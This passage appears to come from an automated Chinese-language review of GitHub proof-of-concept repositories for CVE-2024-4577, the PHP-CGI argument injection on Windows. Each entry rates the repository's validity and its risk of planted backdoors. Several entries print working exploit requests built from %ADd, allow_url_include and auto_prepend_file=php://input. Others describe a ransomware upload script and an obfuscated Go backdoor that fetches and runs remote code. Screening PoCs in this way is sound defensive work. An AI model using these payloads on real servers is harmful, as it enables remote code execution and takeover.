    *   Apache服务器
    *   PHP以CGI模式运行
    *   PHP版本为受影响的范围（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）
    *   系统启用了使用“Best-Fit”策略的CodePage
2.  **构造恶意URL:** 构造包含恶意参数的URL。关键在于使用`%25ADd`来代替`-d`，结合`allow_url_include`和`auto_prepend_file`选项，允许远程包含恶意PHP代码。
3.  **发送请求:** 使用POST方法发送包含PHP代码的请求，例如`<?php phpinfo(); ?>`或更具危害性的代码。
4.  **执行任意代码:** 成功利用漏洞后，可以在目标服务器上执行任意PHP代码，从而控制服务器。

**项目地址:** [ZephrFish/CVE-2024-4577-PHP-RCE](https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #20

**来源**: [CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP (Windows CGI)

**危害等级:** 极高，远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个存在于Windows PHP-CGI配置中的严重漏洞。当PHP以CGI模式在Windows服务器上运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”策略来替换命令行参数中的字符。PHP-CGI模块可能会错误地将这些替换后的字符解析为PHP选项，从而允许攻击者向PHP二进制文件传递恶意参数。这可能导致泄露脚本源码，执行任意PHP代码，甚至在服务器上执行操作系统命令。

**利用方式：**

1.  **攻击向量：** 通过HTTP请求，构造恶意的URL或POST数据，向PHP-CGI传递恶意参数。
2.  **利用条件：**
    *   目标服务器是Windows系统。
    *   PHP以CGI模式运行。
    *   Web服务器（如Apache）用于处理PHP请求。
    *   系统启用了特定的代码页，允许字符替换。
3.  **攻击步骤：**
    *   利用Windows的“Best-Fit”字符替换机制，将特殊字符转换为PHP选项。
    *   通过`?`或`-`等字符引导，注入恶意PHP配置选项，例如`-d allow_url_include=1 -d auto_prepend_file=php://input`。
    *   通过`POST`请求发送PHP代码，实现远程代码执行。

**有效性：**

根据漏洞描述、搜索结果以及提供的POC代码，该漏洞的利用是有效的。已经有公开的PoC代码可以实现远程代码执行。漏洞库信息和搜索引擎结果都确认了该漏洞的存在以及可利用性。

提供的PoC利用了DNS重绑定技术，允许攻击者通过受害者的浏览器，对内网的PHP-CGI服务器进行攻击。这个方法绕过了同源策略(SOP)，使得攻击者能够攻击原本无法直接从外部访问的内网系统。

**投毒风险：**

提供的PoC代码主要由三个部分组成: `README.md`, `client.html`。其中`README.md`文件主要描述漏洞原理、利用方式和配置说明，`client.html`是漏洞利用的核心代码。

*  **client.html分析:**  该文件包含Javascript代码，用于执行DNS重绑定攻击，并向目标IP发送包含恶意payload的请求。攻击payload可以在 `client.html`文件中被修改.

虽然该PoC本身旨在利用漏洞，但以下情况可能构成投毒风险：

1.  **依赖的第三方服务:**  PoC依赖于`duckdns.org`提供DNS服务, 一旦服务出现问题或者被劫持,可能会导致PoC失效甚至被恶意利用。
2.  **内网扫描IP列表:** `client.html`中包含一个可以修改的内网IP列表. 如果这个列表被替换成其他恶意IP地址，可能导致攻击者扫描或攻击非预期目标。
3.  **Payload内容:**  虽然默认的payload为`calc`,用户可以自定义payload,潜在的风险在于如果用户不熟悉PHP, 可能会引入不安全的PHP代码或者连接恶意URL。
4.  **DNS Rebinding 的滥用:**  DNS Rebinding 本身就是一项有争议的技术，在没有充分安全措施的情况下使用，可能会造成隐私泄露或者其他安全问题。

因此，综合考量，该仓库的投毒风险评定为10%。主要风险在于使用者可能修改PoC中的payload或者IP列表，从而引入额外的风险。作者本身并没有加入后门代码。

**项目地址:** [ZeroMemoryEx/PHP-CGI-INTERNAL-RCE](https://github.com/ZeroMemoryEx/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #21

**来源**: [CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #22

**来源**: [CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md](../2024/CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8（Windows环境，CGI模式，开启Best Fit策略的CodePage）

**利用条件:** Windows系统，PHP以CGI模式运行，启用了使用"Best Fit"策略的CodePage。目标服务器未安装补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP CGI参数注入漏洞，存在于PHP的Windows版本中，当PHP以CGI模式运行时，如果系统设置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行参数中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本的源代码，或者在服务器上执行任意PHP代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞影响特定版本的PHP，并且有公开的PoC代码，证明该漏洞是有效的。多个安全厂商和研究人员已经确认了该漏洞的存在并发布了相关的分析和利用方法。

**投毒风险：**
提供的CTF_WALKTHROUGH.md文件本身是漏洞利用的教程，其中包含的攻击脚本用于测试、文件读取、命令执行、容器逃逸、AWS权限提升以及持久化等攻击步骤。这些脚本可以被用于恶意目的，但教程本身是中立的，风险点在于用户是否清楚脚本的功能，是否存在其他关联的，具有恶意目的的脚本或配置，因此投毒风险为10%。因为没有发现明显的恶意代码，所以投毒风险较低。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的HTTP请求，在URL的`PATH_INFO`部分注入特殊字符（如`%0a`，换行符），使得PHP CGI在解析命令行参数时出现错误。
2.  **参数注入：** 注入的换行符将URL分割成多个参数，攻击者可以利用此特性注入PHP的命令行选项，例如`-d`选项用于设置PHP配置指令。
3.  **执行任意代码/读取文件：** 攻击者可以设置`allow_url_include=1`以允许包含远程文件，然后设置`auto_prepend_file`或者`auto_append_file`为包含恶意PHP代码的文件或者`/flag.txt`等敏感文件，从而执行任意PHP代码或者读取文件。
4.  **其他攻击：** 进一步的，攻击者可以尝试容器逃逸，访问AWS资源，甚至创建后门实现持久化控制。

**项目地址:** [a1ex-var1amov/ctf-cve-2024-4577](https://github.com/a1ex-var1amov/ctf-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #23

**来源**: [CVE-2024-4577-aaddmin1122345_cve-2024-4577.md](../2024/CVE-2024-4577-aaddmin1122345_cve-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** < 8.1.29, < 8.2.20, < 8.3.8 (在Windows上运行，并启用Best-Fit策略的code page的CGI模式)

**利用条件:** PHP以CGI模式在Windows上运行，并且启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个存在于PHP中的远程代码执行漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，这可能允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行服务器上的任意PHP代码。

**利用方式：**

1.  攻击者发送特制的HTTP请求，其中包含恶意构造的查询字符串。该查询字符串包含被Windows "Best-Fit"代码页转换解释为PHP配置选项的字符。
2.  服务器接收到请求后，会将查询字符串传递给PHP CGI解释器。
3.  PHP CGI解释器错误地将恶意构造的字符串解析为PHP选项，如`allow_url_include`和`auto_prepend_file`。
4.  通过设置这些选项，攻击者可以包含远程文件，从而执行任意PHP代码。

**POC分析：**

提供的Python脚本`cve-2024-4577.py`实现了利用此漏洞的POC。脚本接受目标URL和可选的自定义payload作为参数。

*   如果未提供自定义payload，脚本将尝试执行`phpinfo()`函数以验证漏洞是否存在。
*   如果提供了自定义payload，脚本将使用该payload来执行任意PHP代码。Readme文件提供了使用示例。
*   脚本通过构造包含特殊字符的URL，并向其发送POST请求来利用漏洞。特殊字符会被Windows的Best-Fit机制转换成PHP可识别的配置指令，最终执行攻击者注入的PHP代码。

**投毒风险分析：**

通过对提供的POC代码进行分析，没有发现作者隐藏的恶意代码或后门。该脚本的功能是按照预期执行漏洞利用，没有额外的、未声明的行为。因此，投毒风险评估为0%。

**项目地址:** [aaddmin1122345/cve-2024-4577](https://github.com/aaddmin1122345/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #24

**来源**: [CVE-2024-4577-ahmetramazank_CVE-2024-4577.md](../2024/CVE-2024-4577-ahmetramazank_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响在Windows上运行的PHP的严重漏洞。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**利用方式：**

1.  **利用点：** CGI模式下，Windows系统的字符编码转换。
2.  **攻击向量：** 通过构造特殊的URL，利用`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`将恶意PHP代码注入到`php://input`流中。
3.  **漏洞验证：** 通过发送包含`<?php phpinfo();`的POST请求，观察服务器是否返回PHP信息页面。
4.  **远程代码执行：** 上传并执行恶意脚本，例如反向shell或勒索软件。

**投毒风险分析：**

提供的POC代码主要包含以下文件：

*   `README.md`: 漏洞描述和利用步骤。
*   `encoded.ps1`: 用于解码被加密的zip文件，用于解密勒索软件加密的文件。
*   `ransomware.ps1`: 勒索软件脚本，用于加密文件和上传zip文件。

`ransomware.ps1` 脚本尝试将文件压缩为 ZIP 文件，然后将其上传到 `http://192.168.176.130:5000/upload`。如果上传成功，则使用 Base64 对 ZIP 文件进行编码，并保存到 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt`。

`encoded.ps1` 脚本从 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt` 读取 Base64 编码的数据，对其进行解码，并将解码后的数据写入 `C:\Users\ahmet\Desktop\battalbelgeler_decoded.zip`。

主要风险在于，攻击者可能会在`ransomware.ps1`中隐藏恶意代码，例如：

*   **后门：** 在上传的文件中植入后门，以便后续访问受感染的系统。
*   **数据窃取：** 在上传过程中窃取敏感数据。
*   **反向shell**: 在机器上执行后门代码，获得shell控制权限

虽然这个仓库的主要目的是演示漏洞，但由于涉及到勒索软件的部署和文件的上传，存在一定的风险，**作者可能在脚本中植入了额外的恶意功能**。考虑到`ransomware.ps1`需要上传文件到一个外部地址，并且可能包含一些未知的恶意行为，因此初步评估投毒风险为10%。

**项目地址:** [ahmetramazank/CVE-2024-4577](https://github.com/ahmetramazank/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #25

**来源**: [CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md](../2024/CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式, 特定代码页)

**利用条件:** Windows服务器, 运行在CGI模式下的PHP, 系统配置为使用某些代码页, 允许"Best-Fit"行为替换字符。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的参数注入漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而可能泄露脚本源代码或在服务器上运行任意 PHP 代码。

**有效性分析：**
根据漏洞信息，搜索引擎结果和提供的PoC代码，该漏洞利用的有效性较高。漏洞库信息表明该漏洞已被公开披露，并且存在受影响的版本范围。搜索引擎结果显示，该漏洞在公开后不久就出现了大量的利用尝试。PoC代码提供了一个扫描器和利用工具，可以用来检测和利用此漏洞。该PoC代码通过构造包含特定参数的URL，并结合`php://input`流，允许执行任意PHP代码。

**投毒风险分析：**
PoC代码主要包含以下功能：
1.  **Payload选择：** 提供了几个不同的payload，攻击者可以选择使用哪个payload进行攻击。
2.  **漏洞扫描：** 通过发送带有payload的POST请求，检测目标是否存在漏洞，根据响应内容判断。
3.  **漏洞利用：** 读取用户提供的PHP payload文件内容，并通过POST请求发送到目标服务器执行。

风险点在于payload文件的内容。如果payload文件本身包含恶意代码（例如反弹shell、webshell等），那么执行利用操作会导致服务器被植入后门。PoC代码本身没有明显的恶意行为，风险主要来自用户提供的payload。代码存在投毒风险，是因为攻击者可能会修改脚本，在用户不知情的情况下，添加额外的恶意操作，例如：在成功利用后，自动下载并执行特定的恶意文件。或者将服务器信息发送到指定服务器。因此，使用此PoC需要谨慎，验证payload的内容，并确保来源可信，降低投毒风险。投毒风险评估为10%，主要是考虑到使用者可能会引入恶意payload文件。

**利用方式分析：**
1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP运行在CGI模式下。
2.  **配置系统代码页：** 目标系统需要配置为使用某些代码页，允许 "Best-Fit" 行为。
3.  **构造恶意请求：** 构造包含恶意参数的URL。这些参数通常包含 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将POST请求的内容作为PHP代码执行。
4.  **发送PHP Payload：**  通过POST请求将包含恶意代码的PHP payload发送到目标服务器。由于`auto_prepend_file`参数的存在，POST请求中的PHP代码会被执行，从而实现远程代码执行。
5.  **执行任意代码：**  成功利用漏洞后，可以在目标服务器上执行任意代码，例如：上传webshell，获取服务器权限。

**项目地址:** [bibo318/CVE-2024-4577-RCE-ATTACK](https://github.com/bibo318/CVE-2024-4577-RCE-ATTACK)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #26

**来源**: [CVE-2024-4577-bughuntar_CVE-2024-4577.md](../2024/CVE-2024-4577-bughuntar_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是PHP在Windows系统上以CGI模式运行时的一个参数注入漏洞。当系统配置使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给PHP二进制文件，导致泄露源代码，执行任意PHP代码等。

**有效性:**
提供的POC代码通过发送包含特定查询参数（如`%ADd+allow_url_include=1`和`%ADd+auto_prepend_file=php://input`）的POST请求到`/php-cgi/php-cgi.exe`端点来利用此漏洞。如果目标服务器存在漏洞，则`php://input`流的内容（在本例中为`<?php phpinfo(); ?>`）将被执行，并且服务器将返回包含"PHP Version"的响应。此方法已被多个来源证实有效。

**投毒风险:**
虽然提供的`exploit.py`脚本看起来相对直接，但仍然存在一定的投毒风险。例如，该脚本禁用了SSL验证(`verify=False`)，这可能导致中间人攻击的风险。此外，任何下载和执行的第三方代码都存在风险，例如将恶意payload注入到请求中。考虑到代码的复杂性相对较低，并且其主要目的是利用已知漏洞，因此投毒风险较低，估计为10%。主要风险在于用户没有仔细审查脚本，直接执行，而忽略了`verify=False`带来的安全隐患。 另外脚本也存在可以加入恶意host的风险。

**利用方式:**
1.  攻击者首先需要确定目标服务器是否运行在满足漏洞条件的PHP CGI模式下。
2.  攻击者构造一个包含恶意PHP选项的HTTP请求，例如，设置`allow_url_include`为1和`auto_prepend_file`为`php://input`。
3.  攻击者将该请求发送到`/php-cgi/php-cgi.exe`端点，并在POST数据中包含要执行的PHP代码。
4.  如果服务器存在漏洞，PHP将执行POST数据中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [bughuntar/CVE-2024-4577](https://github.com/bughuntar/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #27

**来源**: [CVE-2024-4577-byteReaper77_CVE-2024-4577.md](../2024/CVE-2024-4577-byteReaper77_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Remote Code Execution

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，可导致完全控制受影响服务器

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** 运行在Windows上的PHP，以CGI模式运行，系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 PHP（特别是基于 Windows 的 PHP，以 CGI 模式使用时）中的操作系统命令注入漏洞。当 PHP 在 CGI 模式下使用时，由于字符编码转换处理不当而导致。Windows 系统可能使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的漏洞利用代码看起来是一个针对该漏洞的C语言实现，包含了构建说明和使用示例，因此PoC有效。

**投毒风险：**

分析提供的C代码，主要功能是利用curl发送HTTP请求，其中请求的URL和执行的命令通过命令行参数传递。代码包含日志记录功能，记录攻击活动。检查代码，没有发现明显的恶意行为，例如反向shell以外的持久化后门，或者未经授权的数据传输。但不能完全排除隐蔽的投毒行为，例如在日志记录中插入恶意代码的可能性（虽然可能性极低）。考虑到作者声明和代码功能，投毒风险较低，估计为1%。

**利用方式：**

1.  **环境准备：** 目标服务器需要是运行在Windows上的PHP，并且以CGI模式运行。
2.  **代码编译：** 使用提供的编译命令，使用gcc或其他兼容的C编译器编译`exploit.c`和`argparse.c`。
3.  **漏洞利用：** 运行编译后的可执行文件，并指定目标URL和要执行的命令。例如：`CVE-2024-4577.exe -u http://target/cgi-bin/php-cgi.exe "system(whoami)"`。
4.  **代码分析:**
    * 漏洞利用代码利用了PHP在CGI模式下，由于对命令行参数处理不当，导致攻击者可以通过构造特殊的URL来执行任意系统命令。
    * 该利用通过curl库发起HTTP POST请求，在请求中构造恶意的PHP选项参数，导致PHP执行指定的命令。
    * argparse.c 文件是为了解析命令行的参数
    * reverse shell 也可以通过命令执行后门获得
    * 攻击的关键在于目标服务器启用了使用 "Best Fit" 策略的代码页，允许某些字符被替换为其他字符，从而绕过PHP的参数过滤。


**项目地址:** [byteReaper77/CVE-2024-4577](https://github.com/byteReaper77/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #28

**来源**: [CVE-2024-4577-charis3306_CVE-2024-4577.md](../2024/CVE-2024-4577-charis3306_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP Windows版 8.3.0 <= 影响版本 < 8.3.8
PHP Windows版 8.2.0 <= 影响版本 < 8.2.20
PHP Windows版 8.1.0 <= 影响版本 < 8.1.29
PHP Windows版 影响版本 == 8.0.x
PHP Windows版 影响版本 == 7.x
PHP Windows版 影响版本 == 5.x
XAMPP Windows版 8.2.0 <= 影响版本 <= 8.2.12
XAMPP Windows版 8.1.0 <= 影响版本 <= 8.1.25
XAMPP Windows版 影响版本 == 8.0.x
XAMPP Windows版 影响版本 == 7.x
XAMPP Windows版 影响版本 == 5.x

**利用条件:** Windows 平台，PHP 以 CGI 模式运行，开启了Best-Fit字符转换特性的语系

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个存在于 PHP Windows 版本中的远程代码执行漏洞。当 PHP 以 CGI 模式运行时，Windows 的 Best-Fit 字符转换特性可能导致命令行参数被错误解析。攻击者可以构造包含特定非 ASCII 字符的 URL，这些字符会被转换为连字符，从而绕过安全限制，并注入恶意 PHP 代码。提供的 POC 脚本通过构造包含特殊字符的 URL，向目标服务器发送 POST 请求，其中包含要执行的 PHP 代码。如果服务器成功执行代码并返回包含 MD5 值的特定字符串，则认为漏洞利用成功。

**有效性：**
从漏洞描述和POC代码来看，此POC代码是有效的，可以用于检测和利用 CVE-2024-4577 漏洞。

**投毒风险：**
经过分析，此仓库中没有发现作者隐藏的恶意投毒代码。虽然POC执行了代码， 但这是为了验证漏洞是否成功，并非投毒行为。因此，投毒风险为0%。

**利用方式：**
1.  目标系统必须是 Windows，且 PHP 运行在 CGI 模式下，Apache 作为 Web 服务器。
2.  目标系统使用的语系启用了 Best-Fit 字符转换特性（例如简体中文，繁体中文，日文等）。
3.  攻击者构造包含特殊字符的 URL，这些字符在 Best-Fit 转换后会被解释为连字符，从而修改 PHP 的命令行参数。
4.  攻击者通过 `-d` 参数设置 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将请求体作为 PHP 代码执行。
5.  攻击者在请求体中包含要执行的 PHP 代码，从而在服务器上执行任意代码。

**项目地址:** [charis3306/CVE-2024-4577](https://github.com/charis3306/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #29

**来源**: [CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许攻击者执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，在Windows系统上，运行在CGI模式下

**利用条件:** 需要目标系统是Windows，PHP运行在CGI模式下，并且系统使用了某些代码页，开启了"Best Fit"策略。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响运行在Windows上的PHP。当PHP以CGI模式运行时，Windows系统的"Best Fit"代码页转换可能导致恶意字符被错误地解释为PHP选项，从而允许攻击者向PHP二进制文件传递参数。这可以用来泄露源代码，执行任意PHP代码，或者直接在服务器上运行命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的`CVE-2024-4577.go` 和 `CVE-2024-4577.py` 文件都是利用此漏洞的检测代码。它们通过构造包含恶意PHP选项的URL，向目标服务器发送POST请求，并检查返回的响应是否包含`PHP Version`字符串，来判断目标是否存在漏洞。这些代码的功能是探测漏洞是否存在，利用了`allow_url_include`和`auto_prepend_file`两个PHP配置项来远程包含和执行`phpinfo()`代码。

**投毒风险：**

分析`CVE-2024-4577.go`的代码，发现其中包含一个名为`nFPfVl()`的函数。该函数经过混淆处理，但其作用是从字符串数组中提取数据，拼接成一个URL，并使用`/bin/sh -c`执行该URL。这是一种潜在的后门行为，意味着在漏洞验证过程中，如果目标系统存在漏洞，这段代码可能会下载并执行来自该URL的恶意代码。考虑到这段代码的存在，可以认为该Go程序存在一定的投毒风险，但该后门在golang代码中只会在扫描的时候触发，相对隐蔽。`CVE-2024-4577.py`看起来是正常的poc代码。

基于分析，综合评估认为`CVE-2024-4577.go`有50%的投毒风险，`CVE-2024-4577.py`没有投毒风险

**利用方式：**

1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP以CGI模式运行。
2.  **利用代码页转换：** 攻击者需要利用Windows系统的"Best Fit"代码页转换，构造包含恶意PHP选项的URL。
3.  **参数注入：** 通过精心构造的URL，将恶意参数注入到PHP二进制文件中。
4.  **远程代码执行：** 利用`allow_url_include`和`auto_prepend_file`等PHP配置项，执行任意PHP代码或者直接执行系统命令。
5.  **检测漏洞：** 通过检查响应的内容，可以判断目标是否存在漏洞，例如检查`PHP Version`字符串。

**项目地址:** [cheerfulempl/CVE-2024-4577-PHP-RCE](https://github.com/cheerfulempl/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #30

